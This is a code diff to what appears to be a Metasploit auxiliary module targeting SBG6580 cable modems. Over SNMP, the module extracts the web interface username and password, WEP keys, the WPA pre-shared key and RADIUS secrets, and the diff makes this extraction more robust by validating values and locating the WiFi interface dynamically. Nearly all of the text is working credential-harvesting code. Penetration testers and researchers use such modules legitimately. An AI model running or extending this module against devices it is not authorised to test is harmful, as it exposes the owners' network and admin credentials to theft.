@@ -49,10 +49,10 @@ class Metasploit3 < Msf::Auxiliary
         "RADIUS Server", "RADIUS Port", "RADIUS Key"
       ]
 
-      output_data = {}
       output_data = {"Host IP" => ip}
 
-      if snmp.get_value('sysDescr.0').to_s =~ /SBG6580/
+      sys_descr = snmp.get_value('sysDescr.0')
+      if is_valid_snmp_value(sys_descr) and sys_descr.to_s =~ /SBG6580/
         # print connected status after the first query so if there are
         # any timeout or connectivity errors; the code would already
         # have jumped to error handling where the error status is
@@ -63,81 +63,114 @@ class Metasploit3 < Msf::Auxiliary
         # using the CableHome cabhPsDevMib MIB module which defines the
         # basic management objects for the Portal Services (PS) logical element
         # of a CableHome compliant Residential Gateway device
-        device_ui_selection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0').to_i
-        if device_ui_selection == 1
+        device_ui_selection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0')
+        if is_valid_snmp_value(device_ui_selection) and device_ui_selection.to_i == 1
           # manufacturerLocal(1) - indicates Portal Services is using the vendor
           # web user interface shipped with the device
-          device_ui_username = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0').to_s
-          output_data["Username"] = device_ui_username.strip
+          device_ui_username = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0')
+          if is_valid_snmp_value(device_ui_username)
+            output_data["Username"] = device_ui_username.to_s
+          end
 
-          device_ui_password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0').to_s
-          output_data["Password"] = device_ui_password.strip
+          device_ui_password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0')
+          if is_valid_snmp_value(device_ui_password)
+            output_data["Password"] = device_ui_password.to_s
+          end
         end
 
-        primary_wifi_state = snmp.get_value('1.3.6.1.2.1.2.2.1.8.32').to_i
-        if primary_wifi_state != 1
-          # primary Wifi interface is not up
+        wifi_ifindex = get_primary_wifi_ifindex(snmp)
+        if wifi_ifindex < 1
           print_status("Primary WiFi is disabled on the device")
         end
 
-        ssid = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32').to_s
-        output_data["SSID"] = ssid.strip
+        ssid = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.#{wifi_ifindex}")
+        if is_valid_snmp_value(ssid)
+          output_data["SSID"] = ssid.to_s
+        end
 
-        wireless_band = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.1.18.0').to_i
-        output_data["802.11 Band"] = get_wireless_band_name(wireless_band)
+        wireless_band = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.1.18.0')
+        if is_valid_snmp_value(wireless_band)
+          output_data["802.11 Band"] = get_wireless_band_name(wireless_band.to_i)
+        end
 
-        network_auth_mode = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.5.32').to_i
-        network_auth_mode_name = get_network_auth_mode_name(network_auth_mode)
-        output_data["Network Authentication Mode"] = network_auth_mode_name
+        network_auth_mode = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.5.#{wifi_ifindex}")
+        if is_valid_snmp_value(network_auth_mode)
+          network_auth_mode = network_auth_mode.to_i
+          network_auth_mode_name = get_network_auth_mode_name(network_auth_mode)
+          output_data["Network Authentication Mode"] = network_auth_mode_name
+        end
 
         case network_auth_mode
         when 1, 6
           # WEP, WEP 802.1x Authentication
-          wep_passphrase = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.3.32').to_s
-          output_data["WEP Passphrase"] = wep_passphrase.strip
+          wep_passphrase = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.3.#{wifi_ifindex}")
+          if is_valid_snmp_value(wep_passphrase)
+            output_data["WEP Passphrase"] = wep_passphrase.to_s
+          end
 
-          wep_encryption = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.2.32').to_i
-          wep_encryption_name = "unknown"
-          wep_key1 = wep_key2 = wep_key3 = wep_key4 = ""
+          wep_encryption = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.2.#{wifi_ifindex}")
+          if is_valid_snmp_value(wep_encryption)
+            wep_encryption = wep_encryption.to_i
+          else
+            wep_encryption = -1
+          end
+
+          wep_encryption_name = "Unknown"
+          wep_key1 = wep_key2 = wep_key3 = wep_key4 = nil
           # get appropriate WEP keys based on wep_encryption setting
           if wep_encryption == 1
             wep_encryption_name = "64-bit"
-            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.1')
-            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.2')
-            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.3')
-            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.4')
+            wep_key1 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.1")
+            wep_key2 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.2")
+            wep_key3 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.3")
+            wep_key4 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.4")
           elsif wep_encryption == 2
             wep_encryption_name = "128-bit"
-            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.1')
-            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.2')
-            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.3')
-            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.4')
+            wep_key1 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.1")
+            wep_key2 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.2")
+            wep_key3 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.3")
+            wep_key4 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.4")
           end
+
           output_data["WEP Encryption"] = wep_encryption_name
-          output_data["WEP Key 1"] = wep_key1.unpack('H*')[0]
-          output_data["WEP Key 2"] = wep_key2.unpack('H*')[0]
-          output_data["WEP Key 3"] = wep_key3.unpack('H*')[0]
-          output_data["WEP Key 4"] = wep_key4.unpack('H*')[0]
+          if is_valid_snmp_value(wep_key1)
+            output_data["WEP Key 1"] = wep_key1.unpack('H*')[0]
+          end
+          if is_valid_snmp_value(wep_key2)
+            output_data["WEP Key 2"] = wep_key2.unpack('H*')[0]
+          end
+          if is_valid_snmp_value(wep_key3)
+            output_data["WEP Key 3"] = wep_key3.unpack('H*')[0]
+          end
+          if is_valid_snmp_value(wep_key4)
+            output_data["WEP Key 4"] = wep_key4.unpack('H*')[0]
+          end
 
           # get current network key
-          current_key = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.32').to_s
-          output_data["Current Network Key"] = current_key
+          current_key = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.#{wifi_ifindex}")
+          if is_valid_snmp_value(current_key)
+            output_data["Current Network Key"] = current_key.to_s
+          end
 
           if network_auth_mode == 6
-            get_radius_info(snmp, output_data)
+            get_radius_info(snmp, wifi_ifindex, output_data)
           end
 
         when 2, 3, 4, 5, 7, 8
           # process all flavors of WPA
-          wpa_encryption = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.1.32').to_i
-          output_data["WPA Encryption"] = get_wpa_encryption_name(wpa_encryption)
+          wpa_encryption = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.1.#{wifi_ifindex}")
+          if is_valid_snmp_value(wpa_encryption)
+            output_data["WPA Encryption"] = get_wpa_encryption_name(wpa_encryption.to_i)
+          end
 
-          wpa_psk = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32').to_s
-          output_data["WPA Pre-Shared Key (PSK)"] = wpa_psk.strip
+          wpa_psk = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.#{wifi_ifindex}")
+          if is_valid_snmp_value(wpa_psk)
+            output_data["WPA Pre-Shared Key (PSK)"] = wpa_psk.to_s
+          end
 
           case network_auth_mode
           when 4, 5, 8
-            get_radius_info(snmp, output_data)
+            get_radius_info(snmp, wifi_ifindex, output_data)
           end
         end
 
@@ -193,6 +226,27 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
+  def get_primary_wifi_ifindex(snmp)
+    # The ifTable contains interface entries where each row represents
+    # management information for a particular interface. Locate the first
+    # interface where ifType is 71 (ieee80211) and ifAdminStatus is 1 (up).
+    wifi_ifindex = 0
+    ifTable_columns = ["ifIndex", "ifDescr", "ifType", "ifAdminStatus"]
+    snmp.walk(ifTable_columns) do |ifIndex, ifDescr, ifType, ifAdminStatus|
+      if (wifi_ifindex < 1 and ifType.value == 71 and ifAdminStatus.value == 1)
+        wifi_ifindex = ifIndex.value.to_i
+      end
+    end
+    wifi_ifindex
+  end
+
+  def is_valid_snmp_value(value)
+    if value.nil? or value.to_s =~ /Null/ or value.to_s =~ /^noSuch/
+      return false
+    end
+    return true
+  end
+
   def get_network_auth_mode_name(network_auth_mode)
     case network_auth_mode
     when 0
@@ -240,15 +294,21 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def get_radius_info(snmp, output_data)
-    radius_server = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.2.32')
-    output_data["RADIUS Server"] = radius_server.unpack("C4").join(".")
+  def get_radius_info(snmp, wifi_ifindex, output_data)
+    radius_server = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.2.#{wifi_ifindex}")
+    if is_valid_snmp_value(radius_server)
+      output_data["RADIUS Server"] = radius_server.unpack("C4").join(".")
+    end
 
-    radius_port = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.3.32').to_s
-    output_data["RADIUS Port"] = radius_port.strip
+    radius_port = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.3.#{wifi_ifindex}")
+    if is_valid_snmp_value(radius_port)
+      output_data["RADIUS Port"] = radius_port.to_s.strip
+    end
 
-    radius_key = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.4.32').to_s
-    output_data["RADIUS Key"] = radius_key.strip
+    radius_key = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.4.#{wifi_ifindex}")
+    if is_valid_snmp_value(radius_key)
+      output_data["RADIUS Key"] = radius_key.to_s
+    end
   end
 
 end
